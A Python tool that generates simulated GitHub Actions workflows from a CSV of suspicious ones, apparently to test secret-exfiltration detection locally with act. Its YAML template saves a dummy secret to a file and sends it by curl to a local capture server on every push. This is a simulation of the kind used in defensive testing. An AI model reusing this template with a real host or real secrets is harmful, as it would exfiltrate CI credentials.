# tools/generate_simulated_workflows.py
"""
Génère des fichiers ci_simulatedN.yml dans .github/workflows/
à partir de workflow_suspicious.csv (présent à la racine).

Usage:
    .venv activé (recommandé)
    python tools/generate_simulated_workflows.py

Notes de sécurité:
 - Les workflows générés n'exfiltrent QUE vers http://host.docker.internal:5000/collect
   (fallback http://localhost:5000/collect).
 - N'utilise JAMAIS de vrais secrets. Fournis TEST_SECRET factice via act:
     act -j <job_name> -s TEST_SECRET=dummy_value
"""
import csv
import os
import re
from pathlib import Path

ROOT = Path('.').resolve()
CSV_PATH = ROOT / "workflow_suspicious.csv"
OUT_DIR = ROOT / ".github" / "workflows"

# Template YAML (string) — job name et commentaires seront substitués
YAML_TEMPLATE = """# Generated simulated workflow
# Source file: {source_file}
# Orig. workflow name: {workflow_name}
# WARNING: simulation only — uses TEST_SECRET factice and posts to local capture server.
name: {workflow_display_name} - Simulation

on:
  push:
    branches: ["**"]

jobs:
  {job_id}:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Show dummy secret (safe)
        run: |
          echo "Simulation from {workflow_display_name}"
          echo "TEST_SECRET=${{{{ secrets.TEST_SECRET }}}}"

      - name: Save secret to file (simulate leak)
        run: |
          printf "%s" "${{{{ secrets.TEST_SECRET }}}}" > leaked_secret.txt
          echo "secret saved to leaked_secret.txt"

      - name: Exfiltrate to local capture (simulation)
        run: |
          # Post to host.docker.internal (works in many Docker/act setups) then localhost
          curl -sS -X POST -H "Content-Type: text/plain" --data-binary @leaked_secret.txt http://host.docker.internal:5000/collect \\
            || curl -sS -X POST -H "Content-Type: text/plain" --data-binary @leaked_secret.txt http://localhost:5000/collect \\
            || echo "Simulation POST failed"
"""

def slugify(name: str) -> str:
    s = name.strip()
    s = s.lower()
    s = re.sub(r"\s+", "-", s)
    s = re.sub(r"[^a-z0-9\-]", "", s)
    s = re.sub(r"-{2,}", "-", s)
    return s[:50] or "workflow"

def safe_filename(name: str, idx: int) -> str:
    s = slugify(name)
    return f"ci_simulated{idx+1}_{s}.yml"

def safe_job_id(name: str, idx: int) -> str:
    s = slugify(name)
    # must start with letter for job id in GH Actions (best practice)
    if not s or not s[0].isalpha():
        s = "job" + s
    return f"{s}_sim"

def read_csv_rows(csv_path: Path):
    rows = []
    if not csv_path.exists():
        print(f"[ERROR] CSV not found: {csv_path}")
        return rows
    with csv_path.open(newline='', encoding='utf-8') as f:
        reader = csv.DictReader(f)
        for r in reader:
            rows.append(r)
    return rows

def main():
    rows = read_csv_rows(CSV_PATH)
    if not rows:
        print("[WARN] Aucune ligne trouvée dans workflow_suspicious.csv — rien à générer.")
        return

    OUT_DIR.mkdir(parents=True, exist_ok=True)
    generated = []
    for idx, r in enumerate(rows):
        # On prend la colonne 'workflow_name' ou 'file' comme fallback
        workflow_name = (r.get('workflow_name') or r.get('file') or f"workflow_{idx+1}").strip()
        source_file = r.get('file', '').strip()
        display_name = workflow_name

        job_id = safe_job_id(workflow_name, idx)
        filename = safe_filename(workflow_name, idx)
        content = YAML_TEMPLATE.format(
            source_file=source_file,
            workflow_name=workflow_name,
            workflow_display_name=display_name,
            job_id=job_id
        )

        out_path = OUT_DIR / filename
        with out_path.open('w', encoding='utf-8', newline='\n') as fh:
            fh.write(content)
        generated.append((out_path, job_id, display_name))

    print(f"✅ {len(generated)} workflows simulés générés dans {OUT_DIR.resolve()}\n")
    print("Détails générés :")
    for p, job, name in generated:
        print(f" - {p.name}  (job: {job}, display: {name})")

    print("\nProchaine étape : vérifier / personnaliser chaque fichier si besoin, puis exécuter avec act.")
    print("Exemple d'exécution (PowerShell / cmd / bash) :")
    print("  act -j <job_id> -s TEST_SECRET=dummy_value")
    print("Exemple concret (si job listé ci-dessus est 'linters_sim') :")
    print("  act -j linters_sim -s TEST_SECRET=dummy_secret_value_123")

if __name__ == "__main__":
    main()
